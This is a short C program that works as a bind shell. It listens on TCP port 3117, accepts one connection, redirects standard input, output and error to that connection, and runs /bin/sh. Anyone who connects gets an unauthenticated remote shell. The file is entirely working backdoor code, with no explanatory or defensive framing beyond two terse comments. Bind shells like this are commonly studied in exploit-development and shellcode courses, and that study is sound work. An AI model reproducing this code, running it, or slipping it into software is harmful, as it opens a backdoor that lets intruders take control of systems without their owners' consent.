#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
        int client_sock, sockfd;
        int port = 3117;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        
 
        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(port);
        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0
 
        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

        // Listen for incoming connections
        listen(sockfd, 0);
 
        client_sock = accept(sockfd, NULL, NULL);
 
        // Redirect STDIN, STDOUT and STDERR to client_sock
        dup2(client_sock, 0);
        dup2(client_sock, 1);
        dup2(client_sock, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}
